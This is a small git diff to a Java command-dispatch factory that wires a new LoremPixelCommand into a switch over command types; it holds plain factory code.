@@ -3,6 +3,7 @@ package com.theah64.xrob.commandcenter;
 import com.theah64.xrob.commandcenter.commands.CustomCommand;
 import com.theah64.xrob.commandcenter.commands.BaseCommand;
 import com.theah64.xrob.commandcenter.commands.FileSyncCommand;
+import com.theah64.xrob.commandcenter.commands.LoremPixelCommand;
 import com.theah64.xrob.models.Command;
 import com.theah64.xrob.commandcenter.commands.NotificationCommand;
 
@@ -27,6 +28,9 @@ class CommandFactory {
 
             case Command.COMMAND_CUSTOM:
                 return new CustomCommand(command.getCommand());
+
+            case Command.COMMAND_LPIXEL:
+                return new LoremPixelCommand(command.getCommand());
 
             default:
                 throw new BaseCommand.CommandException("Command not defined " + commandType);
